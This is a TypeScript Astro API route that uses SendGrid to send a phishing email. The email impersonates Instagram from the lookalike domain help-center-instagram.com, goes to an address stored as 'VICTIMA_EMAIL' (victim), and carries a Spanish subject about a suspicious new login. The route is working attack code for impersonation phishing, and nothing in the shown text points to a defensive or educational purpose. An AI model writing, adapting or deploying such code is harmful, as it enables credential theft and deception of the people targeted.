import sgMail from "@sendgrid/mail";
import type { APIRoute } from "astro";
import { CONTENIDO_HTML } from "../../assets/contenido";

export const POST: APIRoute = async ({ request }) => {
  const VICTIMA_EMAIL = import.meta.env.PUBLIC_VICTIMA_EMAIL;

  sgMail.setApiKey(import.meta.env.PUBLIC_SENDGRID_API_KEY);
  const msg = {
    to: VICTIMA_EMAIL,
    from: "Instagram <no-reply@help-center-instagram.com>",
    subject: "Nuevo inicio de sesión en Instagram desde Apple iPhone 14 Pro Max",
    html: CONTENIDO_HTML,
  };
  return await sgMail
    .send(msg)
    .then(() => {
      return new Response(
        JSON.stringify({
          success: true,
        }),
        {
          status: 200,
          headers: {
            "Content-Type": "application/json",
          },
        }
      );
    })
    .catch((error) => {
      return new Response(
        JSON.stringify({
          success: false,
          error: (error as Error).message,
        }),
        {
          status: 500,
          headers: {
            "Content-Type": "application/json",
          },
        }
      );
    });
};
